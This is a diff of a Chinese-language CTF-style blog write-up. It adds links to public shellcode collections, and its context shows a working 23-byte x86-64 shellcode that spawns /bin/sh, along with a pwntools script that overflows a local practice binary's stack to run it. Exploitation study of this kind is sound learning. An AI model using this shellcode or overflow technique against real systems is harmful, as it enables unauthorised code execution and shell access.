@@ -39,6 +39,10 @@
 <blockquote>
 <p>shellcode&#x3D;”\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p>
 </blockquote>
+<p>一个找shellcode的网站</p>
+<blockquote>
+<p><a href="https://www.exploit-db.com/shellcodes">https://www.exploit-db.com/shellcodes</a><br><a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a> </p>
+</blockquote>
 <p>这个shellcode只有23个字节，短小精悍，适合放在栈中去执行</p>
 <p>写exp</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">addr = p.recvuntil(<span class="string">&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Now give me your answer&#x27;</span>)</span><br><span class="line">shellcode=<span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span> + p64(<span class="built_in">int</span>(addr,<span class="number">16</span>)+<span class="number">32</span>) + shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
